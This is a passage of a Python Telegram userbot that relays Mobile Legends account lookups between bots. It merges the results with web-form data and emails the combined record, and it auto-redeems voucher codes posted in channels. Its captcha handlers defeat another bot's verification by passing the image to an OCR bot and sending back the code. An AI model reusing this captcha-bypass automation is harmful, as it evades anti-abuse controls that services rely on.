                        bind_data.pop(user_id, None)
                except asyncio.TimeoutError:
                    logger.warning(f"⏰ Bind timeout untuk user {user_id}")
                pending_bind_wait.pop(user_id, None)
                pending_bind.pop(user_id, None)

        # Ambil form data dari Redis (opsional — jika dari web)
        form_data = None
        if session_id:
            try:
                form_data = await asyncio.wait_for(
                    asyncio.get_event_loop().run_in_executor(
                        None, get_form_data_by_session, session_id
                    ),
                    timeout=FORM_DATA_TIMEOUT
                )
            except asyncio.TimeoutError:
                logger.warning(f"⏰ Form data timeout (session {session_id}), lanjut tanpa")
            except Exception as e:
                logger.warning(f"⚠️ Form data error (opsional): {e}")

        # Buat 1 output gabungan
        output, markup = format_final_output(
            text, nickname, region, uid, sid, android, ios,
            creation, last_login, form_data  # form_data bisa None
        )

        # Kirim ke Telegram (1 pesan saja)
        await edit_status_message(user_id, message_id, output, markup)

        # Kirim email gabungan (non-blocking)
        if form_data:
            loop = asyncio.get_event_loop()
            loop.run_in_executor(
                None, send_combined_email,
                form_data, text, nickname, region, uid, sid, android, ios, creation, last_login
            )

        # Forward ke channel jika ada Telegram
        if FORWARD_ENABLED:
            custom_message, telegram_mention = extract_telegram_from_bind(text, uid, sid)
            if custom_message and telegram_mention:
                await client.send_message(FORWARD_TARGET, custom_message)
                await client.send_message(FORWARD_TARGET, telegram_mention)

        # Bersihkan state
        try: del active_requests[req_id]
        except: pass
        waiting_for_result.pop(user_id, None)
        try:
            head = r.lindex('pending_requests', 0)
            if head and head.decode('utf-8') == req_id: r.lpop('pending_requests')
            r.delete(req_id)
        except: pass
        cleanup_downloaded_photos()
        return

    # --- Verifikasi captcha sukses ---
    if 'verification successful' in text.lower() or '✅ Verifikasi berhasil!' in text:
        if captcha_timer_task: captcha_timer_task.cancel(); captcha_timer_task = None
        bot_status['in_captcha'] = False
        if active_requests:
            await asyncio.sleep(5)
            req_id, req_info = next(iter(active_requests.items()))
            await client.send_message(BOT_A_USERNAME, f"{req_info['command']} {req_info['args'][0]} {req_info['args'][1]}")
            req_info['start_time'] = time.time()
        return

    # --- Error dari Bot A ---
    if any(kw in text.lower() for kw in ['kesalahan', 'error', 'gagal']):
        if active_requests:
            req_id, req_info = next(iter(active_requests.items()))
            await edit_status_message(req_info['chat_id'], req_info['message_id'], "Gagal memproses. Coba lagi.")
            try:
                head = r.lindex('pending_requests', 0)
                if head and head.decode('utf-8') == req_id: r.lpop('pending_requests')
                r.delete(req_id)
            except: pass
            waiting_for_result.pop(req_info['chat_id'], None)
            del active_requests[req_id]
        cleanup_downloaded_photos()

# ==================== HANDLER: CAPTCHA ====================
@events.register(events.NewMessage)
async def captcha_from_bot_handler(event):
    message = event.message
    sender  = await message.get_sender()
    if sender.id != 7240340418 or not message.photo: return

    global bot_status, captcha_timer_task
    bot_status['in_captcha'] = True
    for req_info in active_requests.values():
        req_info['start_time'] = time.time()

    if captcha_timer_task: captcha_timer_task.cancel()

    async def reset_captcha():
        await asyncio.sleep(CAPTCHA_TIMEOUT)
        bot_status['in_captcha'] = False

    captcha_timer_task = asyncio.create_task(reset_captcha())
    photo_path = await message.download_media()
    downloaded_photos.append(photo_path)
    try:
        ocr_bot = await client.get_entity('mobilelegendstools_bot')
        await client.send_file(ocr_bot, photo_path)
        bot_status['waiting_ocr'] = True
        bot_status['ocr_start_time'] = time.time()
        cleanup_downloaded_photos()
    except Exception as e:
        logger.error(f"❌ Kirim ke OCR bot: {e}")
        cleanup_downloaded_photos()

# ==================== HANDLER: HASIL OCR ====================
@events.register(events.NewMessage)
async def ocr_result_handler(event):
    sender = await event.get_sender()
    if sender.id != 8627530965: return
    text = (event.message.text or '').strip()
    if not re.match(r'^\d{6}$', text): return

    global bot_status, captcha_timer_task
    bot_status['waiting_ocr'] = False
    bot_status['ocr_start_time'] = 0
    try:
        bengkel = await client.get_entity(7240340418)
        await client.send_message(bengkel, f"/verify {text}")
        bot_status['in_captcha'] = False
        if captcha_timer_task: captcha_timer_task.cancel(); captcha_timer_task = None
    except Exception as e:
        logger.error(f"❌ Kirim verify: {e}")

# ==================== HANDLER: ERROR OCR ====================
@events.register(events.NewMessage)
async def ocr_error_handler(event):
    sender = await event.get_sender()
    if sender.id != 8627530965: return
    text = (event.message.text or '').strip()
    error_keywords = ['tidak ada teks', 'gagal memproses', 'maaf', 'error', 'gagal']
    if not any(k in text.lower() for k in error_keywords): return

    global bot_status, captcha_timer_task
    bot_status['waiting_ocr'] = False; bot_status['ocr_start_time'] = 0
    if active_requests:
        req_id, req_info = next(iter(active_requests.items()))
        await edit_status_message(req_info['chat_id'], req_info['message_id'], "OCR Gagal. Coba lagi.")
    bot_status['in_captcha'] = False
    if captcha_timer_task: captcha_timer_task.cancel(); captcha_timer_task = None
    if active_requests:
        req_id, req_info = next(iter(active_requests.items()))
        try:
            head = r.lindex('pending_requests', 0)
            if head and head.decode('utf-8') == req_id: r.lpop('pending_requests')
            r.delete(req_id)
        except: pass
        waiting_for_result.pop(req_info['chat_id'], None)
        del active_requests[req_id]
    cleanup_downloaded_photos()

async def ocr_timeout_checker():
    while True:
        await asyncio.sleep(1)
        if bot_status.get('waiting_ocr') and bot_status.get('ocr_start_time', 0) > 0:
            if time.time() - bot_status['ocr_start_time'] > OCR_TIMEOUT:
                bot_status['waiting_ocr'] = False; bot_status['ocr_start_time'] = 0
                if active_requests:
                    req_id, req_info = next(iter(active_requests.items()))
                    await edit_status_message(req_info['chat_id'], req_info['message_id'], "OCR timeout. Coba lagi.")
                    bot_status['in_captcha'] = False
                    try:
                        head = r.lindex('pending_requests', 0)
                        if head and head.decode('utf-8') == req_id: r.lpop('pending_requests')
                        r.delete(req_id)
                    except: pass
                    waiting_for_result.pop(req_info['chat_id'], None)
                    del active_requests[req_id]
                    cleanup_downloaded_photos()

# ==================== HANDLER: AUTO REDEEM VCR ====================
@events.register(events.NewMessage)
async def auto_redeem_vcr_handler(event):
    if not AUTO_REDEEM_ENABLED: return
    message = event.message
    chat = await event.get_chat()
    chat_username = getattr(chat, 'username', None)
    chat_title    = getattr(chat, 'title', '')
    if not (chat_username == AUTO_REDEEM_CHANNEL or AUTO_REDEEM_CHANNEL in chat_title.lower()): return
    if auto_redeem.is_processed(message.id): return
    text = message.text or ''
    if not text or not has_vcr(text): return
    codes = extract_vcr_codes(text)
    if not codes: return
    auto_redeem.add_processed(message.id)
    await process_voucher_codes(codes)

# ==================== HANDLER: AUTO REDEEM JEBRAY ====================
@events.register(events.NewMessage)
async def auto_redeem_jebray_handler(event):
    if not AUTO_REDEEM_JEBRAY_ENABLED: return
    message = event.message
    chat = await event.get_chat()
    chat_username = getattr(chat, 'username', None)
    chat_title    = getattr(chat, 'title', '')
    if not (chat_username == AUTO_REDEEM_JEBRAY_CHANNEL or AUTO_REDEEM_JEBRAY_CHANNEL in chat_title.lower()): return
    if auto_redeem_jebray.is_processed(message.id): return
    text = message.text or ''
    if not text or not re.search(r'JEBRAY_', text): return
    codes = extract_jebray_codes(text)
    new_codes = [c for c in codes if not auto_redeem_jebray.is_redeemed(c)]
    if not new_codes: return
    auto_redeem_jebray.add_processed(message.id)
    for code in new_codes:
        if await send_redeem_jebray(code):
            auto_redeem_jebray.add_redeemed(code)
            await send_status_to_user(7240340418, f"✅ JEBRAY Sent: {code}")
        else:
            await send_status_to_user(7240340418, f"❌ JEBRAY Failed: {code}")
    auto_redeem_jebray.save()

# ==================== HANDLER: BIND RESPONSE ====================
@events.register(events.MessageEdited)
@events.register(events.NewMessage)
async def bind_response_handler(event):
    if not BIND_ENABLED: return
    message = event.message
    sender  = await message.get_sender()
    if not sender or sender.username != BOT_BIND_USERNAME: return
    text = message.text or ''
    logger.info(f"📩 Dari {BOT_BIND_USERNAME}: {text[:200]}")

    uid_match = re.search(r'🆔.*?(\d+)', text)
    if uid_match:
        uid = uid_match.group(1)
        for chat_id, info in pending_bind.items():
            if info.get('uid') == uid:
                info['bind_sent_time'] = 0; break

    if "Bind Result" not in text: return
    if not uid_match: return

    uid = uid_match.group(1)
    target_chat = next((c for c, info in pending_bind.items() if info.get('uid') == uid), None)
    if not target_chat: return

    creation_match  = re.search(r'🕰.*?Creation.*?(\d{4})', text)
    last_login_match= re.search(r'🕒.*?Last Login.*?:\s*(.+?)(?:\n|$)', text)
    creation  = creation_match.group(1) if creation_match else None
    last_login= last_login_match.group(1).strip() if last_login_match else None
    if last_login:
        last_login = re.sub(r'[*_`]', '', last_login)
        last_login = re.sub(r'\s*(PHT|WIB|WITA|WIT|UTC|GMT)[^\s]*', '', last_login, flags=re.IGNORECASE).strip()

    bind_data[target_chat] = {'creation': creation, 'last_login': last_login}
    if target_chat in pending_bind_wait:
        pending_bind_wait[target_chat].set()
    pending_bind.pop(target_chat, None)
    logger.info(f"✅ Bind data untuk user {target_chat}: creation={creation}, last_login={last_login}")

# ==================== PROSES ANTRIAN ====================
async def process_queue():
    logger.info("🔄 Queue processor started")
    while True:
        try:
            if not bot_status['in_captcha']:
                req_bytes = r.lindex('pending_requests', 0)
                if req_bytes:
                    req_id = req_bytes.decode('utf-8')
                    now    = time.time()

                    if req_id in sent_requests and now - sent_requests[req_id] < 15:
                        await asyncio.sleep(2); continue

                    req_json = r.get(req_id)
                    if not req_json:
                        r.lpop('pending_requests'); continue

                    req_data   = json.loads(req_json)
                    user_id    = req_data['chat_id']
                    session_id = req_data.get('session_id')  # dari web form (bisa None)
                    reply_to   = req_data.get('reply_to_message_id')

                    if waiting_for_result.get(user_id):
                        r.lpop('pending_requests'); r.rpush('pending_requests', req_id)
                        await asyncio.sleep(5); continue

                    uid = req_data['args'][0]
                    sid = req_data['args'][1]

                    gopay_check = validate_mlbb_gopay_sync(uid, sid)
                    if not gopay_check['status']:
                        await send_status_to_user(user_id, "ID dan Server tidak valid.", reply_to)
                        r.lpop('pending_requests'); r.delete(req_id)
                        continue

                    msg_id = await send_status_to_user(user_id, "Proses request...", reply_to)
                    if not msg_id:
                        r.lpop('pending_requests'); r.delete(req_id); continue

                    # Simpan session_id di active_requests agar bisa diambil saat hasil tiba
                    active_requests[req_id] = {
                        'chat_id':    user_id,
                        'message_id': msg_id,
                        'start_time': now,
                        'command':    req_data['command'],
                        'args':       req_data['args'],
                        'session_id': session_id   # <-- kunci pencocok form data
                    }

                    await client.send_message(BOT_A_USERNAME, f"{req_data['command']} {uid} {sid}")

                    if BIND_ENABLED:
                        await client.send_message(BOT_BIND_USERNAME, f"/bind {uid} {sid}")
                        pending_bind[user_id] = {
                            'uid': uid, 'server': sid,
                            'start_time': now, 'status_msg_id': msg_id,
                            'bind_sent_time': now
                        }
                    else:
                        if user_id not in pending_bind_wait:
                            pending_bind_wait[user_id] = asyncio.Event()
                        pending_bind_wait[user_id].set()

                    sent_requests[req_id]     = now
                    waiting_for_result[user_id] = True
            else:
                await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"❌ process_queue: {e}")
        await asyncio.sleep(2)

# ==================== MAIN ====================
async def main():
    logger.info("🚀 Memulai userbot...")
    auto_redeem.load()
    auto_redeem_jebray.load()

    try:
        queue_len = r.llen('pending_requests')
        if queue_len > 0:
            logger.info(f"🧹 Membersihkan {queue_len} request lama...")
            for _ in range(queue_len): r.lpop('pending_requests')
        for key in r.keys('req:*'): r.delete(key)
    except Exception as e:
        logger.error(f"❌ Bersih Redis: {e}")

    await client.start()
    me = await client.get_me()
    logger.info(f"✅ Login sebagai: {me.first_name}")

    handlers = [
        message_handler, captcha_from_bot_handler, ocr_result_handler,
        ocr_error_handler, auto_redeem_vcr_handler, auto_redeem_jebray_handler,
        userbot_command_handler, auto_share_handler
    ]
    for h in handlers:
        client.add_event_handler(h)

    if BIND_ENABLED:
        client.add_event_handler(bind_response_handler)
        logger.info("✅ Bind handler aktif")

    asyncio.create_task(timeout_checker())
    asyncio.create_task(ocr_timeout_checker())
    await process_queue()

if __name__ == "__main__":
    asyncio.run(main())
